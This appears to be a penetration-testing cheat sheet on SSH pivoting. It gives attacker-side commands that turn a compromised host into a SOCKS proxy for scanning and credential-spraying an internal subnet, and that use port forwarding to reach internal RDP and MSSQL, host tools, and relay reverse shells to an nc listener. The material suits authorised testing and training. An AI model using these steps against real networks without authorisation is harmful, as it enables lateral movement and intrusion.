# Pivoting – SSH Tunneling

### SSH Dynamic SOCKS Proxy — Route Tools Through Compromised Host [added: 2026-04]
- **Tags:** #SSH #SOCKS #DynamicProxy #Proxychains #Pivoting #SSHTunnel #SOCKS5 #PortForward
- **Trigger:** Have SSH access to a host with access to an internal network — need to route scanning/exploitation tools through it as a SOCKS proxy
- **Prereq:** SSH credentials or key for the pivot host + SSH service accessible from attacker + proxychains installed on attacker machine
- **Yields:** SOCKS5 proxy on attacker localhost routing all proxychains traffic through the SSH tunnel into the internal network
- **Opsec:** Low
- **Context:** The simplest pivoting technique — SSH's `-D` flag creates a local SOCKS5 proxy that tunnels traffic through the SSH connection. Combined with proxychains, you can route nmap, crackmapexec, curl, and other tools through the tunnel. No extra binaries needed on the target — SSH is already there.
- **Payload/Method:**
  ```bash
  # --- ATTACKER ---
  # Step 1: Create dynamic SOCKS proxy on local port 1080
  ssh -D 1080 -N -f user@<PIVOT_HOST>
  # -D 1080 = SOCKS proxy on localhost:1080
  # -N      = No remote command (tunnel only)
  # -f      = Background the SSH session

  # Step 2: Configure proxychains (/etc/proxychains4.conf or /etc/proxychains.conf)
  # Add/modify the last line:
  #   socks5 127.0.0.1 1080
  # Make sure 'dynamic_chain' is uncommented and 'strict_chain' is commented out

  # Verify proxychains config
  tail -5 /etc/proxychains4.conf
  # Should show: socks5 127.0.0.1 1080

  # Step 3: Route tools through the SOCKS proxy
  proxychains nmap -sT -Pn -p 21,22,80,135,139,443,445,3389,5985 10.10.10.0/24
  proxychains crackmapexec smb 10.10.10.0/24
  proxychains curl http://10.10.10.100/
  proxychains evil-winrm -i 10.10.10.50 -u admin -p password

  # For tools that support SOCKS natively (no proxychains needed):
  curl --socks5 127.0.0.1:1080 http://10.10.10.100/
  firefox  # Set SOCKS5 proxy to 127.0.0.1:1080 in network settings

  # Using SSH config for persistence (~/.ssh/config)
  # Host pivot
  #     HostName <PIVOT_HOST>
  #     User user
  #     DynamicForward 1080
  #     IdentityFile ~/.ssh/id_rsa
  # Then just: ssh pivot

  # Kill the tunnel when done
  kill $(ps aux | grep "ssh -D 1080" | grep -v grep | awk '{print $2}')
  ```

### SSH Local and Remote Port Forwarding — Access Internal Services [added: 2026-04]
- **Tags:** #SSH #PortForward #LocalForward #RemoteForward #SSHTunnel #Pivoting #ServiceAccess #RDP #WebAdmin
- **Trigger:** Need to access a specific internal service (web panel, RDP, database) through a compromised host with SSH access, or need to expose a local service to the target network
- **Prereq:** SSH credentials or key for the pivot host + SSH service accessible + knowledge of the internal target IP and port
- **Yields:** Direct access to internal services via localhost ports on the attacker machine (local forward), or exposure of attacker services to internal network (remote forward)
- **Opsec:** Low
- **Context:** When you only need access to specific ports (not full subnet routing), SSH port forwarding is simpler and lighter than a SOCKS proxy. Local forward (`-L`) brings an internal port to your machine. Remote forward (`-R`) pushes your local port to the target network. Essential for accessing web admin panels, RDP, databases, and catching reverse shells.
- **Payload/Method:**
  ```bash
  # ========================================
  # LOCAL PORT FORWARDING (-L)
  # Access internal services from your machine
  # ========================================

  # Forward local port 8080 to internal web server 10.10.10.100:80
  ssh -L 8080:10.10.10.100:80 -N -f user@<PIVOT_HOST>
  # Now browse: http://127.0.0.1:8080 → reaches 10.10.10.100:80

  # Forward local port 3390 to internal RDP
  ssh -L 3390:10.10.10.50:3389 -N -f user@<PIVOT_HOST>
  xfreerdp /u:admin /p:password /v:127.0.0.1:3390

  # Forward local port 1433 to internal MSSQL
  ssh -L 1433:10.10.10.200:1433 -N -f user@<PIVOT_HOST>
  impacket-mssqlclient admin:password@127.0.0.1

  # Multiple forwards in one command
  ssh -L 8080:10.10.10.100:80 -L 3390:10.10.10.50:3389 -L 5985:10.10.10.50:5985 -N -f user@<PIVOT_HOST>

  # ========================================
  # REMOTE PORT FORWARDING (-R)
  # Expose attacker services to internal network
  # ========================================

  # Expose attacker's port 80 (web server for tool hosting) on pivot host port 8888
  ssh -R 8888:127.0.0.1:80 -N -f user@<PIVOT_HOST>
  # Internal hosts can now reach http://<PIVOT_HOST>:8888 to download tools

  # Expose attacker's port 4444 (reverse shell listener) on pivot host port 4444
  ssh -R 4444:127.0.0.1:4444 -N -f user@<PIVOT_HOST>
  # Internal targets send reverse shell to <PIVOT_HOST>:4444 → relayed to attacker:4444
  nc -lvnp 4444  # Catch the shell on attacker

  # Note: Remote forwarding to 0.0.0.0 requires GatewayPorts=yes in sshd_config
  # If not set, the remote forward only binds to 127.0.0.1 on the pivot host

  # ========================================
  # VERIFY AND MANAGE TUNNELS
  # ========================================

  # List active SSH tunnel processes
  ps aux | grep "ssh -[LR]"

  # Kill a specific tunnel
  kill $(ps aux | grep "ssh -L 8080" | grep -v grep | awk '{print $2}')

  # Kill all SSH tunnels
  pkill -f "ssh -[LRD].*-N"
  ```
